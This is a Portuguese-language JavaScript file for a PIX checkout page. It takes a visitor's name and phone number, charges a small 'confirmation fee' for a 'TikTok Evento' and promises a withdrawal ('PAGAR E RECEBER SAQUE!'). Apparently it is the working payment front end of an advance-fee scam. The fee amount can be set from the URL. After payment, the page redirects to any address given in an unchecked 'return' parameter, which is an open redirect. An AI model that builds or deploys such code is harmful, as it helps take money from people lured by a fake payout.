// Funções auxiliares
function formatCurrency(value) {
    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(value);
}

function formatPhone(value) {
    value = value.replace(/\D/g, '');
    if (value.length <= 11) {
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{5})(\d)/, '$1-$2');
    }
    return value;
}

// Extrai valor da URL ou usa valor padrão
function getCheckoutValue() {
    const urlParams = new URLSearchParams(window.location.search);
    const valueParam = urlParams.get('valor') || urlParams.get('value') || urlParams.get('amount');
    
    if (valueParam) {
        const numericValue = parseFloat(valueParam.replace(/[^\d,.-]/g, '').replace(',', '.'));
        if (!isNaN(numericValue) && numericValue > 0) {
            return numericValue;
        }
    }
    
    return 21.67;
}

// Inicialização
document.addEventListener('DOMContentLoaded', function() {
    const checkoutForm = document.getElementById('checkout-form');
    const submitBtn = document.getElementById('submit-btn');
    const pixArea = document.getElementById('pix-area');
    const copyPixBtn = document.getElementById('copy-pix-btn');
    const pixCodeInput = document.getElementById('pix-code');
    
    // Obtém o valor do checkout
    const checkoutValue = getCheckoutValue();
    
    // Atualiza os valores na interface
    document.getElementById('order-total').textContent = formatCurrency(checkoutValue);
    document.getElementById('pix-amount').textContent = formatCurrency(checkoutValue);
    
    // Formatação de telefone
    const phoneInput = document.getElementById('phone');
    phoneInput.addEventListener('input', function(e) {
        e.target.value = formatPhone(e.target.value);
    });
    
    // Handler do formulário
    checkoutForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Desabilita o botão
        submitBtn.disabled = true;
        submitBtn.textContent = 'Processando...';
        
        // Coleta os dados do formulário
        const fullName = document.getElementById('fullName').value.trim();
        const phone = document.getElementById('phone').value.trim();
        
        // Validação básica
        if (!fullName || !phone) {
            alert('Por favor, preencha todos os campos obrigatórios.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'PAGAR E RECEBER SAQUE!';
            return;
        }
        
        // Valida telefone (mínimo 10 dígitos)
        const cleanPhone = phone.replace(/\D/g, '');
        if (cleanPhone.length < 10) {
            alert('Por favor, insira um telefone válido.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'PAGAR E RECEBER SAQUE!';
            return;
        }
        
        try {
            // Separa nome e sobrenome
            const nameParts = fullName.split(' ');
            const firstName = nameParts[0] || '';
            const lastName = nameParts.slice(1).join(' ') || '';
            
            // Prepara dados para a API
            const paymentData = {
                amount: checkoutValue,
                description: 'Taxa de confirmação - TikTok Evento',
                customer: {
                    name: fullName,
                    phone: cleanPhone,
                    document: null // CPF opcional, pode ser null
                }
            };
            
            // Gera o pagamento PIX
            const pixResponse = await window.PixupAPI.generatePixPayment(paymentData);
            
            // Verifica se temos o código PIX
            if (pixResponse.qrcode || pixResponse.pix_code || pixResponse.qr_code) {
                const pixCode = pixResponse.qrcode || pixResponse.pix_code || pixResponse.qr_code;
                
                // Atualiza a interface
                pixCodeInput.value = pixCode;
                
                // Gera QR Code usando API externa
                const qrContainer = document.getElementById('pix-qr-container');
                qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}" alt="QR Code PIX">`;
                
                // Mostra a área do PIX
                pixArea.style.display = 'block';
                checkoutForm.style.display = 'none';
                
                // Scroll para a área do PIX
                pixArea.scrollIntoView({ behavior: 'smooth', block: 'start' });
                
                // Inicia verificação de status
                if (pixResponse.transaction_id || pixResponse.id) {
                    const transactionId = pixResponse.transaction_id || pixResponse.id;
                    startPaymentStatusCheck(transactionId);
                }
            } else {
                throw new Error('Código PIX não retornado pela API');
            }
            
        } catch (error) {
            console.error('Erro ao processar pagamento:', error);
            alert('Erro ao gerar código PIX. Por favor, tente novamente.\n\n' + error.message);
            submitBtn.disabled = false;
            submitBtn.textContent = 'PAGAR E RECEBER SAQUE!';
        }
    });
    
    // Handler do botão copiar
    copyPixBtn.addEventListener('click', function() {
        pixCodeInput.select();
        pixCodeInput.setSelectionRange(0, 99999);
        
        try {
            document.execCommand('copy');
            copyPixBtn.innerHTML = '<span>✓ Copiado!</span>';
            copyPixBtn.classList.add('copied');
            
            setTimeout(() => {
                copyPixBtn.innerHTML = '<span>Copiar PIX</span>';
                copyPixBtn.classList.remove('copied');
            }, 2000);
        } catch (err) {
            navigator.clipboard.writeText(pixCodeInput.value).then(() => {
                copyPixBtn.innerHTML = '<span>✓ Copiado!</span>';
                copyPixBtn.classList.add('copied');
                
                setTimeout(() => {
                    copyPixBtn.innerHTML = '<span>Copiar PIX</span>';
                    copyPixBtn.classList.remove('copied');
                }, 2000);
            });
        }
    });
});

// Função para verificar status do pagamento
let statusCheckInterval = null;

function startPaymentStatusCheck(transactionId) {
    statusCheckInterval = setInterval(async () => {
        try {
            const status = await window.PixupAPI.verifyPaymentStatus(transactionId);
            
            if (status.status === 'paid' || status.status === 'completed') {
                // Para a verificação
                if (statusCheckInterval) {
                    clearInterval(statusCheckInterval);
                }
                
                // Redireciona após 2 segundos
                setTimeout(() => {
                    const urlParams = new URLSearchParams(window.location.search);
                    const returnUrl = urlParams.get('return') || urlParams.get('redirect') || '/app/index.html';
                    window.location.href = returnUrl;
                }, 2000);
            }
        } catch (error) {
            console.error('Erro ao verificar status:', error);
        }
    }, 5000);
}
